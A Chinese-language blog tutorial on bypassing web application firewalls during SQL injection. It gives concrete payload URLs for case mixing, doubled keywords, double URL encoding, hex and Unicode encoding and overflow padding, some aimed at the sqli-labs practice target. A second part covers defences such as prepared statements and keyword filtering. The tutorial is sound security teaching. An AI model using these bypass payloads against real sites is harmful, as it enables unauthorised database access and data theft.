+<p>在对waf进行绕过时，我们首先需要知道waf到底过滤了什么，只有摸清楚WAF是如何工作的，才能更好的进行绕过，比如是白名单和黑名单，还是只拦截关键字，或是直接进行过滤去除，我们要根据页面或者URL栏给出的反馈信息，在脑海中构建好攻击绕过思路，唯有如此，我们才能更有效率的进行渗透测试<br> 以sqli-labs靶场为例，我们可以先用常用的sql注入语句，比如：<code>http://127.0.0.1/sqli-labs/Less-25a/?id=1' and 1=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --+</code> ，通过页面的回显，我们可以的知后台过滤了and关键字，既然我们知道它过滤了什么，那么我们就可以针对过滤的内容去构建合适的sql语句去绕过了<img src="https://images2.imgbox.com/8d/e3/9v3SQpiK_o.png" alt="在这里插入图片描述"><br> <font color="bule" size="4" id="rg"><strong>常用的sql注入绕过方法</strong></font></p> 
+<p><strong>1、对于关键字的绕过</strong></p> 
+<p>如对and进行过滤，我们可以尝试：<br> 1.对于and,or的绕过可以尝试一下&amp;&amp;,||,异或特殊符号注入<br> 2.使用注释符绕过，比如: <code>/*!and*/ uni/**/on se/**/lect</code><br> 3.大小写绕过: ANd UniOn SeleCt<br> 4.双关键字绕过:ununionion seselectlect<br> 5.关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成a&lt;nd，一旦插入字符被过滤，&lt;它将作为and传递。</p> 
+<p>空格代替：+ %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /<em>!</em>/</p> 
+<hr> 
+<p><font color="#993399" size="3"><strong>2、大小写混合</strong></font></p> 
+<p>如果正则表达式只针对小写或大写的关键字进行匹配处理，那么我们就可以通过改变攻击字符串中字符的大小来规避它，因为数据库以不区分大小写的方式处理SQL关键字</p> 
+<pre><code>https://mp.csdn.net/index.php?id=-15 uNIoN sELecT 1,2,3,4 
+</code></pre> 
+<p>主要针对正则表达式的规则对大小写敏感进行过滤，但现在直接使用这种绕过技术成功的可能性已经不高了</p> 
+<br> 
+<p><font color="#993399" size="3"><strong>3、替换关键字</strong></font></p> 
+<p>这种情况下大小写转化无法进行绕过而且正则表达式会替换或删除select、union这些关键字，那么这时候我们可以先摸清楚后台的过滤机制，然后针对正则过滤进行利用，如果select、union这些关键字只匹配一次就很容易利用双写关键字进行简单的绕过</p> 
+<pre><code>https://mp.csdn.net/index.php?id=-15  UNIunionON SELselectECT 1,2,3,4 
+</code></pre> 
+<p>替换关键字同样是很基础的技术也可以构造得更复杂SeLSeselectleCTecT关键要看正则表达式会进行几次匹配处理了</p> 
+<br> 
+<p><font color="#993399" size="3"><strong>4.使用编码</strong></font></p> 
+<p><strong>1.URL编码</strong><br> 如在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29</p> 
+<p>普通的URL编码可能无法实现绕过，不过存在某种情况比如URL编码只进行了一次解码过滤，那么这时候我们就可以用两次URL编码进行绕过</p> 
+<pre><code>未编码前：?id=-1' UNION SELECT 1,2,3,4 --+#
+</code></pre> 
+<pre><code>一次编码后：?id=-1%27%20UNION%20SELECT%201,2,3,4%20--+#
+</code></pre> 
+<pre><code>二次编码后：?id=-1%2527%2520UNION%2520SELECT%25201,2,3,4%2520--+#
+</code></pre> 
+<p>可以看到经过二次URL编码后，我们的链接已经跟未编码前大不相同了，这时候，如果后台针对一次编码进行处理，那么，我们就能利用这种方法进行绕过</p> 
+<br> 
+<p><strong>2.十六进制编码</strong><br> 如对后台针对单引号或者关键字进行处理，那么我们就可以使用16进制，把下面的**‘glbimreb21’**变为0x676c62696d7265623231,就可以不需要单引号包裹着变量进行简单的绕过了，在我们用 <strong>16进制进行绕过时，16进制前面要加0x!</strong></p> 
+<pre><code>转换前：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema='glbimreb21' --+
+</code></pre> 
+<pre><code>转换后：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x676c62696d7265623231--+
+</code></pre> 
+<p><strong>3、Unicode编码</strong><br> Unicode是一种行业标准，用于表示多种语言的110,000多个符号和字符。它可以用不同的字符编码表示，Unicode有所谓的标准编码和非标准编码假设我们用的utf-8为标准编码那么西欧语系所使用的就是非标准编码了</p> 
+<p>看一下常用的几个符号的一些Unicode编码</p> 
+<p>单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p> 
+<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p> 
+<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p> 
+<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p> 
+<p>举例：</p> 
+<p>?id=10%D6’%20AND%201=2%23</p> 
+<p>SELECT ‘Ä’=‘A’; #1</p> 
+<p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。</p> 
+<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过。</p> 
+<br> 
+<p><strong>5、缓冲区溢出</strong><br> 缓冲区溢出用于对付WAF在内的软件本身有不少WAF是C语言写的而C语言自身没有缓冲区保护机制因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug从而实现绕过</p> 
+<p>举例</p> 
+<pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+</code></pre> 
+<p>示例0xA*1000指0xA后面”A"重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出</p> 
+<br> 
+<hr> 
+<p><font color="bule" size="4" id="fy"><strong>sql注入的防御措施</strong></font></p> 
+<p>对于SQL注入的防御，我们最常用的就是使用过滤用户输入的恶意语句，或者对其进行转义等处理，但这些方法都不能完全的杜绝sql注入，就如使用过滤我们很容易就可以对它进行绕过，如使用注释，编码等方式，所以这些方法都不能从根源性防治sql注入，所以对于sql注入的防御我把它归为下面三类防御：</p> 
+<p><font color="#993399" size="3"><strong>1.使用参数化查询,检查变量数据类型和格式</strong></font></p> 
+<p>在使用参数化查询的情况下，数据库不会将参数的内容视为SQL执行的一部分，而是作为一个字段的属性值来处理，这样就算参数中包含破环性语句（or ‘1=1’）也不会被执行，也就是说用户输入的变量不是直接嵌入到SQL语句中的，而是通过参数来传递这个变量的，是在数据库完成sql指令的编译后才套用参数运行,那么这样就可以有效的防治SQL注入式攻击<br> <strong>简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑，与此相反，用户的输入的内容必须进行过滤，或者使用参数化的语句来传递用户输入的变量</strong><br> <br></p> 
+<p><font color="#993399" size="3"><strong>2.采用sq语句预编译和绑定变量</strong></font></p> 
+<p>采用PreparedStatement对SQL进行了预编译,如将sql语句:<code>“ SELECT * FROM employees WHERE name = ?”</code>预先编译好,即sql引擎会预先进行语法分析,产生语法树,生成执行计划;这样后面无论你输入什么参数,如（union，select）都不会影响该sql语句的语法结构了。</p> 
+<pre><code>$stmt = $dbConnection-&gt;prepare('SELECT * FROM employees WHERE name = ?');
+$stmt-&gt;bind_param('s', $name);
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();
+while ($row = $result-&gt;fetch_assoc()) {
+}
+</code></pre> 
+<p>PreparedStatement为什么能防止SQL注入？<br> 因为PreparedStatement会对SQL进行了预编译，预处理语句方法会先解析SQL语句，然后通过传入不同的参数值来执行SQL，不需要每次执行都解析SQL语句，<strong>而且预处理查询执行的路径比常规查询短，所以预处理语句方法效率更高</strong>；预处理语句在SQL语句解析协议上避免将参数当做SQL命令执行，仅仅当做值传递，所以可以很好的避免SQL注入。</p> 
+<p><font color="#993399" size="3"><strong>3.增强SQL数据交互点的过滤处理</strong></font></p> 
+<p><strong>如不能采取使用参数化查询和预编译变量，那最好就是加强对SQL数据交互点的过滤</strong></p> 
+<p><strong>可参考以下关键字进行过滤：</strong><br> 每个提交信息的客户端页面，通过服务器端脚本（JSP、ASP、ASPX、PHP等脚本）生成的客户端页面，提交的表单（FORM）或发出的连接请求中包含的所有变量，必须对变量的值进行检查。过滤其中包含的特殊字符，或对字符进行转义处理。特殊字符包括：<br> SQL语句关键词：如 and 、or 、select、declare、update、xp_cmdshell，union；<br> <strong>这里举例部分SQL关键字，需要更详细的了解的可自行网上查资料</strong></p> 
+<p><font color="#993399" size="3"><strong>当然，sql注入还有更多的防范措施，可以配合上面三类再针对以下几点进行防范</strong></font></p> 
+<p>1.不要随意开启生产环境中 Webserver的错误显示，这样一是容易暴露网站的非公开信息，(如web根目录)，二是容易造成报错注入，如非法入侵者可通过extractvalue、updataxml 等函数对网站进行报错sql注入<br> 2.做好数据库帐号权限管理，只给访问数据库的web应用功能所需的最低权限帐号，不要随意使用root账号<br> 3.严格加密处理用户的机密信息，这样就算攻击者通过sql注入的到数据库信息，短时间也无法进行解密读取<br> 4.使用WAF等专业的防护软件系统，毕竟人力有限，总不可能24小时盯着数据库等关键服务器，这时候，waf等防护硬软件将会是我们的第一道防线</p> 
+<p>更新中，未完待续…<br> 2019.10.16</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/0feba32dc154f65874254c59818d42da/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">linux下查看某进程内有多少个线程的方法（ps、top、Htop）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/d8b869878c70c8baa949d61a10ae0e47/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">为了模拟集群idea虚拟复制当前服务，换一个端口进行启动。</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
